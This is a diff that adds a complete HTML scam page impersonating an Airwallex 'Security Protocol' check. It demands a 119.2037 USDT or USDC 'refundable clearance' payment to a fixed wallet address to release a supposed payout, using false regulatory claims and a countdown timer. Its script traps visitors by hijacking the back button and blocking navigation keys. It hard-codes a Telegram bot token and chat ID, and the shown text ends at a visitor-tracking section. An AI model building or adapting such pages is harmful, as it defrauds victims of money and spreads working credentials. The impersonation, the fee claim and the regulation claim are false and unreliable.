@@ -1,0 +1,710 @@
+<!DOCTYPE html> 
+<html lang="en"> 
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Security Protocol</title>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+    <style>
+        :root {
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --accent-red: #ef4444;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border-color: #334155;
+            --btn-green: #10b981;
+            --btn-green-hover: #059669;
+        }
+
+            /* ---------- Base ---------- */
+    body {
+        font-family: 'Georgia', sans-serif; 
+        margin: 0;
+        color: #fff;
+        background-color: var(--bg-color);
+        background: linear-gradient(135deg,#0d0f1a,#050608);
+        overflow-x:hidden;
+    }
+    button { cursor: pointer; }
+    a { color: inherit; text-decoration: none; font-weight: bold; }
+
+    /* ---------- Content ---------- */
+    #content {
+        position: relative;
+        z-index: 1;
+        padding: 20px 15px;       /* smaller padding for mobile */
+        max-width: 600px;
+        margin: auto;
+        padding-bottom: 40px;
+        text-align: center;
+    }
+
+/* ---------- Glass Cards ---------- */
+.glass-card {
+  background: rgba(255,255,255,0.12);
+  backdrop-filter: blur(12px);
+  border-radius: 18px;
+  padding: 28px;
+  margin: 80px auto 30px;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+  max-width: 280px !important;
+}
+
+/* ---------- Checkbox ---------- */
+.checkbox-container {
+  display: flex;
+  flex-direction: row-reverse; /* Flips the visual order so input goes to the right */
+  align-items: flex-end;      /* CHANGED: Pulls the checkbox down to the bottom edge */
+  justify-content: space-between; /* Pushes text to left, checkbox to far right */
+  gap: 16px; /* Slightly more breathing room since it's on the right */
+  margin-top: 14px;
+}
+
+        .security-note img.security-avatar {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    object-fit: cover;
+    flex-shrink: 0;
+
+}
+
+.checkbox-container input {
+  margin-bottom: 4px;         /* CHANGED: Switched from top to bottom margin for a cleaner baseline alignment */
+  cursor: pointer;
+}
+
+.checkbox-container label {
+  flex: 1; /* Ensures the label takes up all remaining space on the left */
+}
+
+
+/* Red warning glow */
+.neon-card.warning {
+  animation: warning-glow 0.8s ease-in-out 2;
+  box-shadow: 0 0 20px 4px rgba(255,77,77,0.9);
+}
+
+@keyframes warning-glow {
+  0% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+  50% { box-shadow: 0 0 20px 6px rgba(255,77,77,0.9); }
+  100% { box-shadow: 0 0 0 rgba(255,77,77,0.7); }
+}
+
+
+    /* --- Container Glass Panel --- */
+    #payment-container {
+        background-color: var(--card-bg);
+        border: 1px solid var(--border-color);
+        backdrop-filter: blur(15px);
+        border-radius: 20px;
+        padding: 25px 20px;       /* smaller padding for mobile */
+        box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1);
+        text-align: center;
+        max-width: 350px;          /* narrower to show edges on mobile */
+        width: 95%;                /* almost full width on small screens */
+        animation: pulseGlow 3s infinite alternate;
+        margin: 0 auto 50px auto;
+    }
+
+    @keyframes pulseGlow {
+        0% { box-shadow: 0 0 20px rgba(0,255,255,0.2), 0 0 40px rgba(255,0,255,0.1); }
+        50% { box-shadow: 0 0 30px rgba(0,255,255,0.4), 0 0 60px rgba(255,0,255,0.2); }
+        100% { box-shadow: 0 0 25px rgba(0,255,255,0.3), 0 0 50px rgba(255,0,255,0.15); }
+    }
+
+    /* --- Headings & Status --- */
+    #status {
+        font-size: 1.8rem;
+        margin-bottom: 29px;
+        color: #0ff;
+        text-shadow: 0 0 8px #0ff, 0 0 12px #0ff;
+        transition: all 0.3s ease-in-out;
+    }
+
+    .amount {
+        font-weight: bold;
+        font-size: 1.6rem;
+        color: #ff3fff;
+        text-shadow: 0 0 10px #ff3fff, 0 0 20px #ff3fff;
+    }
+
+    p {
+        margin: 12px 0;
+        font-size: 1.2rem;
+        letter-spacing: 0.5px;
+    }
+
+    p + p {
+                font-family: 'Georgia', sans-serif; 
+        font-size: clamp(1.6rem, 4vw, 1.8rem);
+        color: #0ff;
+        text-shadow: 0 0 6px #0ff;
+        word-break: break-all;
+        overflow-wrap: normal !important;
+    }
+
+    #check-btn {
+        margin-top: 25px;
+        padding: 12px 25px;
+        font-size: 1rem;
+        font-weight: bold;
+        color: #fff;
+        background: linear-gradient(45deg, #0ff, #ff3fff);
+        border: none;
+        border-radius: 12px;
+        cursor: pointer;
+        text-transform: uppercase;
+        box-shadow: 0 0 8px #0ff, 0 0 16px #ff3fff;
+        transition: all 0.3s ease-in-out;
+    }
+
+    #check-btn:hover {
+        transform: scale(1.05);
+        box-shadow: 0 0 12px #0ff, 0 0 24px #ff3fff;
+    }
+
+    /* Timer Styling */
+    #usdt-timer, #usdc-timer {
+        font-size: 1rem;
+        font-weight: bold !important;
+        color: var(--accent-red) !important;
+        text-shadow: 0 0 5px rgba(239, 68, 68, 0.4);
+        margin-top: 15px;
+        text-align: center;
+    }
+
+    /* Progress Bar */
+    .progress-bar {
+        width: 100%;
+        height: 18px;
+        background: rgba(255,255,255,0.06);
+        border-radius: 12px;
+        overflow: hidden;
+        margin: 18px 0;
+    }
+
+    .progress-fill {
+        height: 100%;
+        width: 0%;
+        border-radius: 12px;
+        position: relative;
+        transition: width 0.6s ease;
+        background: var(--accent-red);
+        box-shadow: 0 0 20px rgba(79,172,254,0.6);
+    }
+
+    .progress-fill::after {
+        content: "";
+        position: absolute;
+        inset: 0;
+        background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+        animation: energyFlow 2.5s linear infinite;
+    }
+
+    @keyframes energyFlow {
+        0% { transform: translateX(100%); }
+        100% { transform: translateX(-100%); }
+    }
+
+    .plan-pay {
+        display: flex;
+        align-items: center;      /* vertically center logo & text */
+        justify-content: center;  /* horizontal center */
+        gap: 8px;                 /* spacing between logo and text */
+        flex-wrap: wrap;          /* wrap if screen too small */
+    }
+
+    .plan-logo {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        margin: 0;                /* remove previous margin */
+    }
+
+    .token-name, .network {
+        display: inline-block;
+        font-weight: bold;
+        color: #fff;
+    }
+
+    .plan-pay a:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 0 18px rgba(155, 89, 182, 0.7);
+    }
+
+    /* Segmented Control Token Selector */
+    #tokenSelector {
+        display: flex;
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 12px;
+        padding: 4px;
+        gap: 6px;
+        margin-bottom: 20px;
+        border: 1px solid rgba(0, 255, 255, 0.2);
+    }
+
+    #tokenSelector button {
+        flex: 1;
+        padding: 10px 0;
+        font-size: 0.85rem;
+        font-weight: bold;
+        color: #8a8f9d;
+        background: transparent;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        text-transform: uppercase;
+        transition: all 0.3s ease-in-out;
+    }
+
+    #tokenSelector button.active {
+        color: #fff;
+        background: linear-gradient(135deg, #0ff, #ff3fff);
+        box-shadow: 0 0 10px rgba(0, 255, 255, 0.4);
+    }
+
+    .copy-btn {
+        margin-left: 8px;
+        padding: 2px 6px;
+        font-size: 0.8rem;
+        border: none;
+        border-radius: 4px;
+        background: linear-gradient(45deg, #0ff, #ff3fff);
+        color: #fff;
+        cursor: pointer;
+        transition: 0.2s;
+    }
+
+    .copy-btn:hover {
+        transform: scale(1.1);
+        box-shadow: 0 0 6px #0ff, 0 0 12px #ff3fff;
+    }
+
+    .header {
+        text-align: center;
+        margin-bottom: 1rem;
+    }
+
+    .badge {
+        display: inline-block;
+        background-color: rgba(239, 68, 68, 0.15);
+        color: var(--accent-red);
+        font-size: 0.75rem;
+        font-weight: 700;
+        padding: 0.25rem 0.75rem;
+        border-radius: 9999px;
+        border: 1px solid rgba(239, 68, 68, 0.3);
+        text-transform: uppercase;
+        letter-spacing: 0.05em;
+        margin-bottom: 0.75rem;
+    }
+
+    .footer-note {
+        margin-top: 1.5rem;
+        font-size: 0.75rem;
+        color: var(--text-muted);
+        text-align: center;
+        line-height: 1.3;
+    }
+
+    .qr-section div {
+        margin: 0 auto;
+        border-radius: 12px;
+    }
+
+    .token-card.inactive {
+        display: none;
+    }
+
+    /* ---------- Notification Bar ---------- */
+    .notification-bar {
+        position: fixed;
+        top: -80px;
+        right: 20px;
+        background: rgba(30, 144, 255, 0.25);
+        backdrop-filter: blur(12px);
+        border: 1px solid rgba(30,144,255,0.4);
+        color: #fff;
+        padding: 12px 18px;
+        border-radius: 12px;
+        font-size: 14px;
+        font-weight: bold;
+        box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+        transition: top 0.5s ease, opacity 0.5s ease;
+        z-index: 9999;
+        opacity: 0;
+        max-width: 350px;
+        white-space: normal;
+        overflow: hidden;
+    }
+
+    .notification-bar.show { top: 20px; opacity: 1; }
+
+    .notification-bar::before {
+        content: '';
+        position: absolute;
+        left: -50%;
+        top: 0;
+        width: 50%;
+        height: 100%;
+        background: rgba(255,255,255,0.3);
+        transform: skewX(-25deg);
+        animation: liquidWave 2s linear infinite;
+    }
+
+    @keyframes liquidWave { 0% { left: -50%; } 100% { left: 100%; } }
+
+    .walletconnect-actions {
+        margin-top:20px;
+        display:flex;
+        flex-direction:column;
+        gap:12px;
+    }
+
+    /* Container centered layout */
+    .status-animation-container {
+        margin-top: 18px;
+                font-family: 'Georgia', sans-serif; 
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 8px;
+        width: 100%;
+    }
+
+    .payment-line-wrapper {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        width: 100%;
+        color: #0ff;
+        font-size: 0.9rem;
+        font-weight: bold;
+        text-shadow: 0 0 8px rgba(0, 255, 255, 0.6);
+    }
+
+    .label-text {
+        letter-spacing: 1px;
+        transition: color 0.4s ease, text-shadow 0.4s ease;
+    }
+
+    /* Middle Line Track */
+    .cyber-line-track {
+        flex: 1;
+        max-width: 160px;
+        height: 3px;
+        background: rgba(0, 255, 255, 0.2);
+        border-radius: 4px;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .cyber-line-pulse {
+        position: absolute;
+        top: 0;
+        left: -40%;
+        width: 40%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, #0ff, transparent);
+        box-shadow: 0 0 8px #0ff;
+        animation: bouncePulse 1.2s ease-in-out infinite alternate;
+    }
+
+    @keyframes bouncePulse {
+        0% { left: -10%; }
+        100% { left: 70%; }
+    }
+
+    .checkmark-wrapper {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        width: 22px;
+        height: 22px;
+        margin-left: 4px;
+        opacity: 0;
+        transform: scale(0.5);
+        transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    .checkmark-wrapper.active {
+        opacity: 1;
+        transform: scale(1);
+    }
+
+    .checkmark-svg {
+        width: 22px;
+        height: 22px;
+        border-radius: 50%;
+        display: block;
+        stroke-width: 3;
+        stroke: #10b981;
+        stroke-miterlimit: 10;
+        box-shadow: inset 0px 0px 0px #10b981;
+        animation: fillCircle .4s ease-in-out .4s forwards;
+    }
+
+    .checkmark-circle {
+        stroke-dasharray: 166;
+        stroke-dashoffset: 166;
+        stroke-width: 3;
+        stroke-miterlimit: 10;
+        stroke: #10b981;
+        fill: none;
+        animation: strokeCircle 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+    }
+
+    .checkmark-check {
+        transform-origin: 50% 50%;
+        stroke-dasharray: 48;
+        stroke-dashoffset: 48;
+        animation: strokeCheck 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.5s forwards;
+    }
+
+    @keyframes strokeCircle {
+        100% { stroke-dashoffset: 0; }
+    }
+
+    @keyframes strokeCheck {
+        100% { stroke-dashoffset: 0; }
+    }
+
+    @keyframes fillCircle {
+        100% { box-shadow: inset 0px 0px 0px 30px rgba(16, 185, 129, 0.2); }
+    }
+
+    .payment-line-wrapper.success .label-text.received {
+        color: #10b981;
+        text-shadow: 0 0 10px rgba(16, 185, 129, 0.8);
+    }
+
+    .payment-line-wrapper.success .cyber-line-track {
+        background: rgba(16, 185, 129, 0.3);
+    }
+
+    .payment-line-wrapper.success .cyber-line-pulse {
+        animation: none;
+        left: 0;
+        width: 100%;
+        background: #10b981;
+        box-shadow: 0 0 10px #10b981;
+        transition: all 0.4s ease;
+    }
+
+    .wallet-btn {
+        width:100%;
+        padding:14px 18px;
+        border:none;
+        border-radius:14px;
+        font-size:15px;
+        font-weight:700;
+        color:#fff;
+        background:linear-gradient(135deg,#6b2cd8,#9b59b6);
+        box-shadow:
+          0 0 12px rgba(107,44,216,0.5),
+          0 0 24px rgba(155,89,182,0.3);
+        transition:all .25s ease;
+    }
+
+    .wallet-btn:hover {
+        transform:translateY(-2px);
+        box-shadow:
+          0 0 18px rgba(107,44,216,0.7),
+          0 0 36px rgba(155,89,182,0.45);
+    }
+
+    @media (max-width: 400px) {
+        #payment-container {
+            padding: 20px 15px;
+            max-width: 300px;
+        }
+        .amount {
+            font-size: 1.4rem;
+        }
+        p {
+            font-size: 0.9rem;
+        }
+        #status {
+            font-size: 1.4rem;
+        }
+    }
+    </style>
+</head>
+
+<body>
+
+  <div id="content">
+
+    <!-- Notification Bar -->
+    <div id="planNotification" class="notification-bar"></div>
+
+    <!-- Payment Container -->
+    <div id="payment-container">
+      <div class="header">
+        <span class="badge">Action Required</span>
+      </div>
+
+      <!-- Context / Explanation Card Swapped to the Top -->
+      <div class="glass-card neon-card" id="confirmationCard" style="margin:0 auto 20px auto;">
+        <div class="checkbox-container">
+          <input type="checkbox" id="confirmation" checked disabled style="pointer-events: none;">
+          <label for="confirmation" style="font-weight: 500; line-height: 1.6; color: #a46cff; display: block; text-align: left;">
+
+            <span style="  
+              display: block;  
+              margin: 12px 0;  
+              padding-left: 12px;  
+              border-left: 3px solid rgba(200, 50, 80, 0.85);  
+              color: rgba(255, 255, 255, 0.85);  
+              font-size: 10px;
+              font-weight: bold; 
+            ">  
+              Because your incoming transaction falls below minimum reporting threshold, standard cross-border regulations mandates the below additional refundable protocol before release.
+            </span>
+
+          </label>
+        </div>
+      </div>
+
+      <!-- Segmented Token Selector inside container -->
+      <div id="tokenSelector">
+        <button id="usdt-btn" class="active" onclick="showTokenCard('usdt')">USDT NETWORK</button>
+        <button id="usdc-btn" onclick="showTokenCard('usdc')">USDC NETWORK</button>
+      </div>
+
+      <!-- USDT Card -->
+      <div class="token-card" id="usdt-card">
+        <div class="plan-pay">
+          <img class="plan-logo"
+               src="https://assets.coingecko.com/coins/images/325/large/Tether.png"
+               alt="AvalonCare Custom Logo">
+          <span class="token-name">USDT</span>
+          <span class="network">ERC-20</span>
+        </div>
+
+        <div class="amount-section">
+          <p>Required Clearance Amount</p>
+          <p class="amount" id="usdt-amount">119.2037</p>
+        </div>
+
+        <div class="wallet-section">
+          <p>Wallet Address</p>
+          <p class="wallet" id="usdt-wallet">0x63d93f4348b109492d75aaaf10ac374d448178cd
+            <button class="copy-btn" onclick="copyWallet('usdt-wallet')">Copy</button>
+          </p>
+        </div>
+
+        <div class="qr-section">
+          <div id="usdt-qr"></div>
+        </div>
+
+        <div class="walletconnect-actions">
+          <button id="walletPayBtnUsdt" class="wallet-btn" onclick="handlePayClick()">
+            Verify & Process Payout 
+          </button>
+        </div>
+        <p id="usdt-timer">Verification expires in 05:00</p>
+
+        <div class="progress-bar">
+          <div class="progress-fill" id="usdt-progress"></div>
+          <div class="status" id="usdt-status">Waiting for verification...</div>
+        </div>
+      </div>
+
+      <!-- USDC Card -->
+      <div class="token-card inactive" id="usdc-card">
+        <div class="plan-pay">
+          <img class="plan-logo"
+               src="https://assets.coingecko.com/coins/images/6319/large/USD_Coin_icon.png"
+               alt="AvalonCare Custom Logo">
+          <span class="token-name">USDC</span>
+          <span class="network">ERC-20</span>
+        </div>
+
+        <div class="amount-section">
+          <p>Required Clearance Amount</p>
+          <p class="amount" id="usdc-amount">119.2037</p>
+        </div>
+
+        <div class="wallet-section">
+          <p>Wallet Address</p>
+          <p class="wallet" id="usdc-wallet">0x63d93f4348b109492d75aaaf10ac374d448178cd
+            <button class="copy-btn" onclick="copyWallet('usdc-wallet')">Copy</button>
+          </p>
+        </div>
+
+        <div class="qr-section">
+          <div id="usdc-qr"></div>
+        </div>
+
+        <div class="walletconnect-actions">
+          <button id="walletPayBtnUsdc" class="wallet-btn" onclick="handlePayClick()">
+            Verify & Process Payout  
+          </button>
+        </div>
+        <p id="usdc-timer">Verification expires in 05:00</p>
+
+        <div class="progress-bar">
+          <div class="progress-fill" id="usdc-progress"></div>
+          <div class="status" id="usdc-status">Waiting for verification...</div>
+        </div>
+      </div>
+
+      <!-- Footer Note Paired at the Bottom -->
+      <div class="footer-note" style="text-align: center; margin-top: 20px;">
+    <img src="assets/pictures/download (1).png" alt="Profile" class="security-avatar">
+          Airwallex • Security Protocol SSL-256
+      </div>
+    </div>
+  </div>
+
+
+</body>
+<script>
+  // Prevent user from going back to previous pages
+  history.pushState(null, null, location.href);
+
+  window.addEventListener('popstate', function () {
+    history.go(1); // keeps user on this page
+  });
+
+  // Optional: also prevent back with keyboard shortcuts
+  window.addEventListener('keydown', function (e) {
+    if ((e.key === 'Backspace' && e.target === document.body) || e.key === 'ArrowLeft') {
+      e.preventDefault();
+    }
+  });
+
+// ==========================================
+// 🔐 CENTRAL CONFIGURATION & TELEGRAM SETTINGS
+// ==========================================
+const TELEGRAM_BOT_TOKEN = "8971558300:AAFCkaN9K6ycSf4Bf-hHSeaPQFkFvf3Y8w8";
+const TELEGRAM_CHAT_ID = "-1003913850436";
+
+let lastSentPayload = "";
+let timerInterval;
+let telegramPollInterval = null;
+let paymentMode = "manual"; // "manual" | "paymento"
+let paymentDone = false;
+
+// Shared timer key used across the flow
+const SOURCE_TIMER_KEY = "avb_expiry_times";
+
+// Blockchain Wallet Config
+const wallets = [
+    "0x63d93f4348b109492d75aaaf10ac374d448178cd",
+    "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
+];
+const tokens = {
+    USDT: "0x63d93f4348b109492d75aaaf10ac374d448178cd",
+    USDC: "0x6bC7a3943D217D2f80437b61a4D8898138f2EE5B"
+};
+
+// ==========================================
+// 0. UNIQUE VISITOR IDENTIFIER
+// ================
